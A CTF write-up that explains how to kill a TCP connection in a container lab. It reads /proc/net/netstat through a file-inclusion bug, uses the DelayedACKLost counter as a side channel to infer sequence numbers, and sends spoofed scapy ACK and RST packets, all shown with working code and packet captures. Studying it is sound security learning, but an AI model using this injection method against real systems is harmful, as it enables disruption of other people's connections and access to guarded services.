# *ctf challenge oh-my-socket

## TL;DR

This is a writeup that dives deep into TCP, RST packets and sequence numbers and shows how to terminate a TCP connection between two parties by injecting spoofed packets into the TCP communication from a third machine that has some side channel access to one of the other machines.

Moreover in the appendix section it shows what is happening "on the wire" while we exploit this. Also you can see it is a pretty lengthy post - this is because I really liked playing with TCP and scapy to make the magic happen.

Solution: [starctf-oh-my-socket-solution.py](starctf-oh-my-socket-solution.py)

## Overview

In this challenge we are given a URL to an upload function on a webserver as long with the IP addresses of the webserver, a client and a server.

All three "machines" are built as docker containers running on dedicated and fixed IP addresses:

* server: `172.20.0.2`
* client: `172.20.0.3`
* webserver: `172.20.0.4`

The complete source and Dockerfiles are also given.

## Analysis

The flag is present on the `server` container and can be requested via TCP on port 21587:

```Python
(...)
HOST = '172.21.0.2'
PORT = 21587
BUFSIZ = 1024
ADDR = (HOST, PORT)

tcpSerSock = socket(AF_INET, SOCK_STREAM)
tcpSerSock.bind(ADDR)
tcpSerSock.listen(5)

cnt = 0
while True:
    print('waiting for connection...')
    tcpCliSock, addr = tcpSerSock.accept()
    (...)
    try:
        while True:
            data = tcpCliSock.recv(BUFSIZ)

            if not data:
                break
            if data == b'*ctf':
                content = open('oh-some-funny-code').read()
                tcpCliSock.send((content.encode()))

            else:
                tcpCliSock.send(('[%s] %s' % (ctime(), data)).encode())
    except Exception as e:
        pass
(...)
```

To get the flag we have to send `*ctf` to the socket and can then read the flag from the socket. An important detail is that the server is not threaded for forked so that the server can only work on one connection at a time.

This one connection gets established by the `client` container directly at startup (and connection does not get stopped at any time):

```Python
HOST = '172.21.0.2'
PORT = 21587
BUFSIZ =1024
ADDR = (HOST,PORT)

tcpCliSock = socket(AF_INET,SOCK_STREAM)
tcpCliSock.bind(('172.21.0.3',7775))
tcpCliSock.connect(ADDR)

while True:
    try:
         data1 = tcpCliSock.recv(BUFSIZ)
         if not data1:
             break
         print(data1.decode('utf-8'))
    except ConnectionResetError:
        tcpCliSock.close()
    except Exception:
        pass
```

Note: One strange detail we see here is that the client explicitly binds to the local port `7775`.

This running client prevents us from just connecting to the server to get the flag. Another thing we find on the client is another app that has straight LFI:

```Python
@app.route("/file", methods=['GET','POST'])
def file():
    file = request.args.get('name')
    content = open(file).read()
    return content
```

Looking into the webserver source code we can see that uploaded files are just executed with `python3` and output is returned:

```Python
@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
(...)
        f = request.files['file']
        f.save(os.path.join(f.filename))

        try:
            output = check_output(['python3', f.filename], stderr=STDOUT, timeout=80)
            content = output.decode()
(...)
        return content
```

#### TL;DR

* RCE on `webserver`
* LFI on `client`
* Flag to get via TCP from `server` (blocked by `client` connection)

**TODO**: Get rid of this `client` to `server` connection before we can get the flag from the `server` by connecting to it through the `webserver` RCE.

## Idea

The only way to terminate a TCP session without access to either the client or the server can be accomplished by sending a TCP RST packet. Looking into [RFC793 Section 3.4](https://tools.ietf.org/html/rfc793#section-3.4) we can read:

> Reset Processing
>
> In all states except SYN-SENT, all reset (RST) segments are validated
> by checking their SEQ-fields.  A reset is valid if its sequence number
> is in the window.  In the SYN-SENT state (a RST received in response
> to an initial SYN), the RST is acceptable if the ACK field
> acknowledges the SYN.
>
> The receiver of a RST first validates it, then changes state.  If the
> receiver was in the LISTEN state, it ignores it.  If the receiver was
> in SYN-RECEIVED state and had previously been in the LISTEN state,
> then the receiver returns to the LISTEN state, otherwise the receiver
> aborts the connection and goes to the CLOSED state.  If the receiver
> was in any other state, it aborts the connection and advises the user
> and goes to the CLOSED state.

This means a legitimate RST packet (correct SEQ [sequence] number) is processed by the TCP and aborts the connection locally (`ESTABLISHED` -> `CLOSED`). Essentially following data is needed to craft a proper RST packet:

* Source IP
* Source Port
* Destination IP
* Destination Port
* Sequence Number

(Un)fortunately there seems to be no programmatic way to get the sequence numbers of a connection from the `/proc` file system as this would impose risks from local attackers (terminating connections, injecting into TCP streams, etc.). Also the sequence number is a 32bit integer that is initialized with a random value (`ISN`) and incremented for every packet being transferred. So it can't be guessed or bruteforced (details in [RFC6528](https://tools.ietf.org/html/rfc6528)).

After some googling I found this [post (with linked paper)](https://lwn.net/Articles/531090/) that documents a side channel attack via the `DelayedACKLost` counter. The counter increases when the local TCP stacks sends a delayed and duplicated ACK because the remote peer retransmitted a packet.

> The key to this search is a bug in the way the Linux kernel handles packets with incorrect sequence numbers. If a packet is received that has a sequence number "less than" that which is expected, the DelayedACKLost counter is incremented—regardless of whether the packet is an acknowledgment (ACK) or not. The calculation that is done to determine whether the number is less than what is expected essentially partitions the 32-bit sequence number space into two halves. Because DelayedACKLost does not get incremented if the sequence number is larger than the expected number, it can be used in a search to narrow in on the value of interest.

Luckily the mentioned `DelayedACKLost` counter can still be found in `/proc/net/netstat` (*note*: different kernel versions have different columns in `netstat`).

As we have `scapy` installed on the `webserver` container where we have RCE with `root` permissions we may use the `DelayedACKLost`-oracle to determine the current sequence number by crafting spoofed packets.

## Exploit

### Attack Plan

We are planning following attack (from `webserver`):

* Spoof out-of-oder packets from `server` to `client`.
* Watch `/proc/net/netstat`'s `DelayedACKLost` counter.
* Get `server`'s current sequence number by carefully watching the counter.
* Send `RST` packet to terminate the client connection.

### Attack

To get the `DelayedACKLost` counter we will be using the LFI on the `client` app using this Python code:

```Python
def get_client_netstat_delayedacklost():
    r = requests.get('http://172.21.0.3:5000/file?name=/proc/net/netstat')
    new_dal = r.text.split('\n')[1].split()[19]
    return int(new_dal)
```

This get `netstat` from the client and gets the 20th column on the 2nd line (which is the `DelayedACKLost` counter).

When sending our spoofed packets to the `client` (source IP from `server`) we can use this oracle to see if the `server`'s sequence number is smaller or bigger than the faked sequence number we are sending.

We will be sending spoofed packets with `scapy`:

```Python
send(IP(src="172.21.0.2",dst="172.21.0.3")/TCP(sport=21587,dport=7775,flags='A',seq=SEQUENCENUMBER)/'A',verbose=False)
```

First I tried to do a recursive divide and conquer approach like this:

```Python
def binary_search_recursive(start, end):
    global dal
    if start > end:
        # We are near the correct sequence (off by one)
        return start

    mid = (start+end) // 2
    send(IP(src="172.21.0.2",dst="172.21.0.3")/TCP(sport=21587,dport=7775,flags='A',seq=mid)/'A',verbose=False)
    new_dal = get_client_netstat_delayedacklost()

    if new_dal > dal:
        dal = new_dal
        print("[-] Sent fake probe packet from server to client with sequence {:10}. DelayedACKLost counter on client: {:3} (increased: sequence number is bigger)".format(mid,new_dal))
        return binary_search_recursive(mid+1, end)
    else:
        print("[-] Sent fake probe packet from server to client with sequence {:10}. DelayedACKLost counter on client: {:3} (not increased: sequence number is smaller)".format(mid,new_dal))
        return binary_search_recursive(start, mid-1)
```

Unfortunately this solution is not stable. The problem seems to be that depending on the current real sequence number that sometime the counter won't increase although the spoofed sequence number is smaller. The reason for this seems to be that whenever you are close to a sequence number wrap the TCP stack does some magic here while calculating out-of-sequence ACKs.

Therefore I added a first step that does not begin in the middle (`2**31`) like the divide and conquer would do but to just start with a sequence of 0 and go up in `2**24` chunks until we find the sequence number bounds that way. Also this part of the code finds the first sequence number chunk where the `DelayedACKLost` counter first increases (and thus we are safe from the counter wrap magic now):

```Python
x,b = False,False
for seq in range(int(2**32/2**24)):
    # Send a packet for the IPs in question with an "arbitrary" sequence number.
    send(IP(src="172.21.0.2",dst="172.21.0.3")/TCP(sport=21587,dport=7775,flags='A',seq=seq*2**24)/'A',verbose=False)
    # Get the DelayedACKLost counter from the client container.
    new_dal = get_client_netstat_delayedacklost()
    print("[-] Sent fake probe packet from server to client with sequence {:10}. DelayedACKLost counter on client: {:3}".format(seq*2**24,new_dal))
    # If the counter increased the sequence number is lower than the current one.
    #   BUT: If you are too close to a counter wrap there seems to be some magic
    #        therefore only break out of this loop if the DelayedACKLost counter
    #        at least increased once (x = True)
    if new_dal > dal:
        x = True
        dal = new_dal
    else:
        if x == True:
            print("[!] DelayedACKLost counter did not increase.")
            end = seq
            b = True
    if b == True:
        break
```

Using this approach we can then start to search the real sequence number using devide and conquer in a range of `2**24` only:

```Python
# Get the approximate sequence number
seqno = binary_search_recursive((seq-1)*2**24,seq*2**24)
print("[+] Sequence number approximately: {}".format(seqno))
```

In fact this is not an approximate sequence number but either the correct sequence number (or the number before the correct sequence number). One detail here is: sending an ACK for the current sequence number and for the sequence number before (seq-1) will not be distinguishable from the `DelayedACKLost` counter. So just to be sure I will be sending 20 RST packets (for the next 20 sequences):

```Python
for i in range(20):
    # The matching RST packet makes the client break out of his loop and close the socket.
    send(IP(src="172.21.0.2",dst="172.21.0.3")/TCP(sport=21587,dport=7775,flags='R',seq=seqno+i),verbose=False)
```

And indeed the connection on the `client` gets terminated successfully.

### Fail & Refine Attack

**BUT** what we were missing in the attack plan was that the `server` connection won't be terminated that way. Looking into [RFC793 Section 3.4](https://tools.ietf.org/html/rfc793#section-3.4) again we can read:

> Reset Generation
>
> As a general rule, reset (RST) must be sent whenever a segment arrives
> which apparently is not intended for the current connection.  A reset
> must not be sent if it is not clear that this is the case.
>
> There are three groups of states:
>
>   1.  If the connection does not exist (CLOSED) then a reset is sent
>   in response to any incoming segment except another reset.  In
>   particular, SYNs addressed to a non-existent connection are rejected
>   by this means.
>
>   If the incoming segment has an ACK field, the reset takes its
>   sequence number from the ACK field of the segment, otherwise the
>   reset has sequence number zero and the ACK field is set to the sum
>   of the sequence number and segment length of the incoming segment.
>   The connection remains in the CLOSED state.
>
> (...)

We successfully moved the `client` connection entry to the `CLOSED` state in the previous step. If we can make the `server` send another packet with the correct sequence number to the `client` the receiving TCP stack will send a `RST` packet as mandated by RFC793.

To make the `server` send a legitimate packet to the client connection (correct sequence number) I used the same way as before but in the other direction: when I spoofed a `client` packet to the `server` the server responded with an ACK (`DelayedACKLost`) to the `client`. The real `client` getting the packet sees that there is no connection anymore and generates a proper `RST` packet to the `server` finally leading to connection termination on the `server`.

Last step is just a TCP connection to the server on port 21587 sending `*ctf` to get the flag:

```Python
# Now as the server socket is not blocked anymore we can just connect and get the flag. Copied the code from client.py:
print("[+] Connecting to the server to get the flag.")
HOST = '172.21.0.2'
PORT = 21587
BUFSIZ =1024
ADDR = (HOST,PORT)
tcpCliSock = socket(AF_INET,SOCK_STREAM)
tcpCliSock.connect(ADDR)
tcpCliSock.send(b'*ctf')
data1 = tcpCliSock.recv(BUFSIZ)
print("[!] Flag: {}".format(data1.decode('utf-8')))
exit(0)
```

## Appendix

I am not sure if anyone scrolled down to this section but anyway this section will show tcpdump outputs from `client` and `server` during connection startup (when the containers start) and while conducting the attack. Additionally it will show some of the script output.

Just for the completeness here is how I `nsenter` into the docker container and start `tcpdump`:

```
root@ubu:~# nsenter -t $(docker inspect -f '{{.State.Pid}}' app1_client) -n tcpdump -vvS -enni eth0 port 7775
```

The command gets the container PID of `app1_client` and enters into the network namespace of the process. Then it starts `tcpdump` with a filter on port 7775 (client port) and it will show the absolute sequence numbers (`-S`) and also increase verbosity (`-vv`) because else no sequence numbers would be shown.

### Connection Setup

When starting the containers a TCP three-way-handshake between the `client` (`172.21.0.3`) and the `server` (`172.21.0.2`) can be seen:

```
21:59:13.472998 02:42:ac:15:00:03 > 02:42:ac:15:00:02, ethertype IPv4 (0x0800), length 74: (tos 0x0, ttl 64, id 16723, offset 0, flags [DF], proto TCP (6), length 60)
    172.21.0.3.7775 > 172.21.0.2.21587: Flags [S], cksum 0x585e (incorrect -> 0x6327), seq 2538559707, win 64240, options [mss 1460,sackOK,TS val 2089333330 ecr 0,nop,wscale 7], length 0
21:59:13.473038 02:42:ac:15:00:02 > 02:42:ac:15:00:03, ethertype IPv4 (0x0800), length 74: (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 60)
    172.21.0.2.21587 > 172.21.0.3.7775: Flags [S.], cksum 0x585e (incorrect -> 0xb61b), seq 3130168331, ack 2538559708, win 65160, options [mss 1460,sackOK,TS val 1682241151 ecr 2089333330,nop,wscale 7], length 0
21:59:13.473047 02:42:ac:15:00:03 > 02:42:ac:15:00:02, ethertype IPv4 (0x0800), length 66: (tos 0x0, ttl 64, id 16724, offset 0, flags [DF], proto TCP (6), length 52)
    172.21.0.3.7775 > 172.21.0.2.21587: Flags [.], cksum 0x5856 (incorrect -> 0xe17a), seq 2538559708, ack 3130168332, win 502, options [nop,nop,TS val 2089333330 ecr 1682241151], length 0

```

We can see the `SYN` (`[S]`) packet from the `client` as a first packet and see the initial sequence number (ISN) the client chose: `seq 2538559707`. The second packet, `SYN-ACK` (`[S.]`), is from the `server` and we can see its' chosen initial (ISN): `seq 3130168331`. As a side note we can also see that the server acknowledges the `client`'s ISN: `ack 2538559708`. The third packet is the acknowledgment of the `server`'s ISN by the `client`.

The connection will just sit there idle for minutes (and hours) as the client and server code do not transmit any data at all: the server is waiting for data from the client, the client is not sending anything.

When we upload `starctf-oh-my-socket-solution.py` to the `webserver` the fun begins and the script is trying to get the `2**24` range of the `server`'s sequence number:

```
[+] DelayedACKLost on client: 0 (INIT)
[-] Sent fake probe packet from server to client with sequence          0. DelayedACKLost counter on client:   0
[-] Sent fake probe packet from server to client with sequence   16777216. DelayedACKLost counter on client:   0
[-] Sent fake probe packet from server to client with sequence   33554432. DelayedACKLost counter on client:   0
[-] Sent fake probe packet from server to client with sequence   50331648. DelayedACKLost counter on client:   0
(...)
```

In the packet capture we can see those spoofed packets:

```
22:01:55.131746 02:42:ac:15:00:04 > 02:42:ac:15:00:03, ethertype IPv4 (0x0800), length 55: (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 41)
    172.21.0.2.21587 > 172.21.0.3.7775: Flags [.], cksum 0x83f1 (correct), seq 0:1, ack 0, win 8192, length 1
22:01:55.131783 02:42:ac:15:00:03 > 02:42:ac:15:00:02, ethertype IPv4 (0x0800), length 66: (tos 0x0, ttl 64, id 16725, offset 0, flags [DF], proto TCP (6), length 52)
    172.21.0.3.7775 > 172.21.0.2.21587: Flags [.], cksum 0x5856 (incorrect -> 0x69fd), seq 2538559708, ack 3130168332, win 502, options [nop,nop,TS val 2089494989 ecr 1682241151], length 0

22:01:55.176812 02:42:ac:15:00:04 > 02:42:ac:15:00:03, ethertype IPv4 (0x0800), length 55: (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 41)
    172.21.0.2.21587 > 172.21.0.3.7775: Flags [.], cksum 0x82f1 (correct), seq 16777216:16777217, ack 0, win 8192, length 1
22:01:55.176844 02:42:ac:15:00:03 > 02:42:ac:15:00:02, ethertype IPv4 (0x0800), length 66: (tos 0x0, ttl 64, id 16726, offset 0, flags [DF], proto TCP (6), length 52)
    172.21.0.3.7775 > 172.21.0.2.21587: Flags [.], cksum 0x5856 (incorrect -> 0x69d0), seq 2538559708, ack 3130168332, win 502, options [nop,nop,TS val 2089495034 ecr 1682241151], length 0

22:01:55.220703 02:42:ac:15:00:04 > 02:42:ac:15:00:03, ethertype IPv4 (0x0800), length 55: (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 41)
    172.21.0.2.21587 > 172.21.0.3.7775: Flags [.], cksum 0x81f1 (correct), seq 33554432:33554433, ack 0, win 8192, length 1
22:01:55.220737 02:42:ac:15:00:03 > 02:42:ac:15:00:02, ethertype IPv4 (0x0800), length 66: (tos 0x0, ttl 64, id 16727, offset 0, flags [DF], proto TCP (6), length 52)
    172.21.0.3.7775 > 172.21.0.2.21587: Flags [.], cksum 0x5856 (incorrect -> 0x69a4), seq 2538559708, ack 3130168332, win 502, options [nop,nop,TS val 2089495078 ecr 1682241151], length 0

22:01:55.260716 02:42:ac:15:00:04 > 02:42:ac:15:00:03, ethertype IPv4 (0x0800), length 55: (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 41)
    172.21.0.2.21587 > 172.21.0.3.7775: Flags [.], cksum 0x80f1 (correct), seq 50331648:50331649, ack 0, win 8192, length 1
22:01:55.260747 02:42:ac:15:00:03 > 02:42:ac:15:00:02, ethertype IPv4 (0x0800), length 66: (tos 0x0, ttl 64, id 16728, offset 0, flags [DF], proto TCP (6), length 52)
    172.21.0.3.7775 > 172.21.0.2.21587: Flags [.], cksum 0x5856 (incorrect -> 0x697c), seq 2538559708, ack 3130168332, win 502, options [nop,nop,TS val 2089495118 ecr 1682241151], length 0

```

We see `ACK` packets with `seq 0:1`, `16777216:16777217`, `33554432:33554433` and `50331648:50331649` from the spoofed `server` to the `client`. The `client` answers with `ACK` packets (but `ACK`ing the correct sequence number: `ack 3130168332`). Unfortunately we do not see this packet from `webserver` so we can't just sniff the sequence number from the wire ;-).

*Note*: As you can see from the non-increasing `DelayedACKLost` counter we see this TCP stack magic here because the sequence number is "near" the 32bit wrap.

Eventually the script finds the sequence number range where the `DelayedACKLost` counter begins increasing:

```
[-] Sent fake probe packet from server to client with sequence  956301312. DelayedACKLost counter on client:   0
[-] Sent fake probe packet from server to client with sequence  973078528. DelayedACKLost counter on client:   0
[-] Sent fake probe packet from server to client with sequence  989855744. DelayedACKLost counter on client:   1
[-] Sent fake probe packet from server to client with sequence 1006632960. DelayedACKLost counter on client:   2
[-] Sent fake probe packet from server to client with sequence 1023410176. DelayedACKLost counter on client:   3
(...)
```

And finally after some time it finds where `DelayedACKLost` is not increasing anymore:

```
(...)
[-] Sent fake probe packet from server to client with sequence 3087007744. DelayedACKLost counter on client: 126
[-] Sent fake probe packet from server to client with sequence 3103784960. DelayedACKLost counter on client: 127
[-] Sent fake probe packet from server to client with sequence 3120562176. DelayedACKLost counter on client: 128
[-] Sent fake probe packet from server to client with sequence 3137339392. DelayedACKLost counter on client: 128
[!] DelayedACKLost counter did not increase.
[+] Determined lower bound of sequence number: 3120562176
[+] Determined upper bound of sequence number: 3137339392

```

We now know that the real sequence number must be between `3120562176` and `3137339392` (this is in fact true as the real sequence is `3130168332`). The exploit switches into device and conquer mode now:

```
[+] Starting divide and conquer in those bounds.
[-] Sent fake probe packet from server to client with sequence 3128950784. DelayedACKLost counter on client: 129 (increased: sequence number is bigger)
[-] Sent fake probe packet from server to client with sequence 3133145088. DelayedACKLost counter on client: 129 (not increased: sequence number is smaller)
(...)
```

On the wire we see that the script switches from the `2**24` ranges to divide and conquer:

```
22:02:02.824850 02:42:ac:15:00:04 > 02:42:ac:15:00:03, ethertype IPv4 (0x0800), length 55: (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 41)
    172.21.0.2.21587 > 172.21.0.3.7775: Flags [.], cksum 0xcaf0 (correct), seq 3103784960:3103784961, ack 0, win 8192, length 1
22:02:02.824887 02:42:ac:15:00:03 > 02:42:ac:15:00:02, ethertype IPv4 (0x0800), length 78: (tos 0x0, ttl 64, id 16910, offset 0, flags [DF], proto TCP (6), length 64)
    172.21.0.3.7775 > 172.21.0.2.21587: Flags [.], cksum 0x5862 (incorrect -> 0xa3d6), seq 2538559708, ack 3130168332, win 502, options [nop,nop,TS val 2089502682 ecr 1682241151,nop,nop,sack 1 {3103784960:3103784961}], length 0

22:02:02.872824 02:42:ac:15:00:04 > 02:42:ac:15:00:03, ethertype IPv4 (0x0800), length 55: (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 41)
    172.21.0.2.21587 > 172.21.0.3.7775: Flags [.], cksum 0xc9f0 (correct), seq 3120562176:3120562177, ack 0, win 8192, length 1
22:02:02.872860 02:42:ac:15:00:03 > 02:42:ac:15:00:02, ethertype IPv4 (0x0800), length 78: (tos 0x0, ttl 64, id 16911, offset 0, flags [DF], proto TCP (6), length 64)
    172.21.0.3.7775 > 172.21.0.2.21587: Flags [.], cksum 0x5862 (incorrect -> 0xa1a6), seq 2538559708, ack 3130168332, win 502, options [nop,nop,TS val 2089502730 ecr 1682241151,nop,nop,sack 1 {3120562176:3120562177}], length 0

22:02:02.904639 02:42:ac:15:00:04 > 02:42:ac:15:00:03, ethertype IPv4 (0x0800), length 55: (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 41)
    172.21.0.2.21587 > 172.21.0.3.7775: Flags [.], cksum 0xc8f0 (correct), seq 3137339392:3137339393, ack 0, win 8192, length 1
22:02:02.904687 02:42:ac:15:00:03 > 02:42:ac:15:00:02, ethertype IPv4 (0x0800), length 66: (tos 0x0, ttl 64, id 16912, offset 0, flags [DF], proto TCP (6), length 52)
    172.21.0.3.7775 > 172.21.0.2.21587: Flags [.], cksum 0x5856 (incorrect -> 0x4ba0), seq 2538559708, ack 3130168332, win 502, options [nop,nop,TS val 2089502762 ecr 1682241151], length 0

22:02:02.944578 02:42:ac:15:00:04 > 02:42:ac:15:00:03, ethertype IPv4 (0x0800), length 55: (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 41)
    172.21.0.2.21587 > 172.21.0.3.7775: Flags [.], cksum 0xc970 (correct), seq 3128950784:3128950785, ack 0, win 8192, length 1
22:02:02.944599 02:42:ac:15:00:03 > 02:42:ac:15:00:02, ethertype IPv4 (0x0800), length 78: (tos 0x0, ttl 64, id 16913, offset 0, flags [DF], proto TCP (6), length 64)
    172.21.0.3.7775 > 172.21.0.2.21587: Flags [.], cksum 0x5862 (incorrect -> 0xa05e), seq 2538559708, ack 3130168332, win 502, options [nop,nop,TS val 2089502802 ecr 1682241151,nop,nop,sack 1 {3128950784:3128950785}], length 0

22:02:02.984738 02:42:ac:15:00:04 > 02:42:ac:15:00:03, ethertype IPv4 (0x0800), length 55: (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 41)
    172.21.0.2.21587 > 172.21.0.3.7775: Flags [.], cksum 0xc930 (correct), seq 3133145088:3133145089, ack 0, win 8192, length 1
22:02:02.984767 02:42:ac:15:00:03 > 02:42:ac:15:00:02, ethertype IPv4 (0x0800), length 66: (tos 0x0, ttl 64, id 16914, offset 0, flags [DF], proto TCP (6), length 52)
    172.21.0.3.7775 > 172.21.0.2.21587: Flags [.], cksum 0x5856 (incorrect -> 0x4b50), seq 2538559708, ack 3130168332, win 502, options [nop,nop,TS val 2089502842 ecr 1682241151], length 0
```

And it continues:

```
[-] Sent fake probe packet from server to client with sequence 3130168330. DelayedACKLost counter on client: 136 (increased: sequence number is bigger)
[-] Sent fake probe packet from server to client with sequence 3130168331. DelayedACKLost counter on client: 136 (not increased: sequence number is smaller)
[+] Sequence number approximately: 3130168331
```

We can see that the exploit  found the correct `server`'s sequence number `3130168331`. Now we have all needed information to craft a `RST` packet: source IP, source port, destination IP, destination port, sequence number.

We then go ahead and send the 20 RST packets (I added a sleep 5 into the exploit script before sending the RSTs):

```
[+] Sending 20 RSTs with increasing sequences just in case...
[!] Connection to server on client should be reset now.
```

On the wire:

```
22:02:03.860880 02:42:ac:15:00:04 > 02:42:ac:15:00:03, ethertype IPv4 (0x0800), length 55: (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 41)
    172.21.0.2.21587 > 172.21.0.3.7775: Flags [.], cksum 0x3554 (correct), seq 3130168330:3130168331, ack 0, win 8192, length 1
22:02:03.860912 02:42:ac:15:00:03 > 02:42:ac:15:00:02, ethertype IPv4 (0x0800), length 78: (tos 0x0, ttl 64, id 16924, offset 0, flags [DF], proto TCP (6), length 64)
    172.21.0.3.7775 > 172.21.0.2.21587: Flags [.], cksum 0x5862 (incorrect -> 0x7491), seq 2538559708, ack 3130168332, win 502, options [nop,nop,TS val 2089503718 ecr 1682241151,nop,nop,sack 1 {3130168330:3130168331}], length 0

22:02:03.900913 02:42:ac:15:00:04 > 02:42:ac:15:00:03, ethertype IPv4 (0x0800), length 55: (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 41)
    172.21.0.2.21587 > 172.21.0.3.7775: Flags [.], cksum 0x3553 (correct), seq 3130168331:3130168332, ack 0, win 8192, length 1


22:02:08.936469 02:42:ac:15:00:04 > 02:42:ac:15:00:03, ethertype IPv4 (0x0800), length 54: (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 40)
    172.21.0.2.21587 > 172.21.0.3.7775: Flags [R], cksum 0x7660 (correct), seq 3130168331, win 8192, length 0
22:02:08.976457 02:42:ac:15:00:04 > 02:42:ac:15:00:03, ethertype IPv4 (0x0800), length 54: (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 40)
    172.21.0.2.21587 > 172.21.0.3.7775: Flags [R], cksum 0x765f (correct), seq 3130168332, win 8192, length 0
(...)
22:02:09.636576 02:42:ac:15:00:04 > 02:42:ac:15:00:03, ethertype IPv4 (0x0800), length 54: (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 40)
    172.21.0.2.21587 > 172.21.0.3.7775: Flags [R], cksum 0x764e (correct), seq 3130168349, win 8192, length 0
22:02:09.676331 02:42:ac:15:00:04 > 02:42:ac:15:00:03, ethertype IPv4 (0x0800), length 54: (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 40)
    172.21.0.2.21587 > 172.21.0.3.7775: Flags [R], cksum 0x764d (correct), seq 3130168350, win 8192, length 0
```

We can see that the client connection successfully terminates at `22:02:08`:

```
root@63c89d5bd3d5:/client# while : ; do printf "%s :: %s\n" "`date`" "`ss | grep 7775`" ; sleep 1 ; done
(...)
Sun Jan 17 21:02:06 UTC 2021 :: tcp    ESTAB      0      0      172.21.0.3:7775                 172.21.0.2:21587                
Sun Jan 17 21:02:07 UTC 2021 :: tcp    ESTAB      0      0      172.21.0.3:7775                 172.21.0.2:21587                
Sun Jan 17 21:02:08 UTC 2021 :: tcp    ESTAB      0      0      172.21.0.3:7775                 172.21.0.2:21587                
Sun Jan 17 21:02:09 UTC 2021 ::
Sun Jan 17 21:02:10 UTC 2021 ::
Sun Jan 17 21:02:11 UTC 2021 ::
(...)
```

Whereas we see that the server connection is still `ESTAB` at the same time:

```
root@7d952cbd0d11:/server# while : ; do printf "%s :: %s\n" "`date`" "`ss | grep 7775`" ; sleep 1 ; done
(...)
Sun Jan 17 21:02:06 UTC 2021 :: tcp    ESTAB      0      0      172.21.0.2:21587                172.21.0.3:7775                 
Sun Jan 17 21:02:07 UTC 2021 :: tcp    ESTAB      0      0      172.21.0.2:21587                172.21.0.3:7775                 
Sun Jan 17 21:02:08 UTC 2021 :: tcp    ESTAB      0      0      172.21.0.2:21587                172.21.0.3:7775                 
Sun Jan 17 21:02:09 UTC 2021 :: tcp    ESTAB      0      0      172.21.0.2:21587                172.21.0.3:7775                 
Sun Jan 17 21:02:10 UTC 2021 :: tcp    ESTAB      0      0      172.21.0.2:21587                172.21.0.3:7775                 
Sun Jan 17 21:02:11 UTC 2021 :: tcp    ESTAB      0      0      172.21.0.2:21587                172.21.0.3:7775                 
(...)
```

So we send the mentioned spoofed packet from `client` to the `server` (I added another 5s sleep here):

```
[+] Sending a fake packet to the server to trigger a packet to the client and in turn a proper RST from client to server.
[!] Connection from client on server should be reset now as well.
```

On the wire (`tcpdump` on the server as the client won't see the spoofed ACK):

```
22:02:14.751530 02:42:ac:15:00:04 > 02:42:ac:15:00:02, ethertype IPv4 (0x0800), length 55: (tos 0x0, ttl 64, id 1, offset 0, flags [none], proto TCP (6), length 41)
    172.21.0.3.7775 > 172.21.0.2.21587: Flags [.], cksum 0x0988 (correct), seq 31337:31338, ack 0, win 8192, length 1
22:02:14.751559 02:42:ac:15:00:02 > 02:42:ac:15:00:03, ethertype IPv4 (0x0800), length 66: (tos 0x0, ttl 64, id 4420, offset 0, flags [DF], proto TCP (6), length 52)
    172.21.0.2.21587 > 172.21.0.3.7775: Flags [.], cksum 0x5856 (incorrect -> 0x83ba), seq 3130168332, ack 2538559708, win 510, options [nop,nop,TS val 1682422430 ecr 2089503718], length 0
22:02:14.751587 02:42:ac:15:00:03 > 02:42:ac:15:00:02, ethertype IPv4 (0x0800), length 54: (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 40)
    172.21.0.3.7775 > 172.21.0.2.21587: Flags [R], cksum 0xf4d2 (correct), seq 2538559708, win 0, length 0
```

The spoofed first packet (`seq 31337:31338`) from the `client` to `server` will trigger an `ACK` back to the `client` that has the correct `seq`/`ack` numbers. When this packet reaches the `client` it returns a `RST` packet with the correct `seq` (of the client, the TCP stack takes it from the `ack` it received before) and thus makes the server to terminate the connection as well:

```
root@7d952cbd0d11:/server# while : ; do printf "%s :: %s\n" "`date`" "`ss | grep 7775`" ; sleep 1 ; done
(...)
Sun Jan 17 21:02:12 UTC 2021 :: tcp    ESTAB      0      0      172.21.0.2:21587                172.21.0.3:7775                 
Sun Jan 17 21:02:13 UTC 2021 :: tcp    ESTAB      0      0      172.21.0.2:21587                172.21.0.3:7775                 
Sun Jan 17 21:02:14 UTC 2021 :: tcp    ESTAB      0      0      172.21.0.2:21587                172.21.0.3:7775                 
Sun Jan 17 21:02:15 UTC 2021 ::
Sun Jan 17 21:02:16 UTC 2021 ::
Sun Jan 17 21:02:17 UTC 2021 ::
```

The script then goes ahead, connects to the server and gets the flag:

```
[+] Connecting to the server to get the flag.
[!] Flag: *ctf{ohhh_just_other_web_s111de_channel}
```

Mission accomplished.
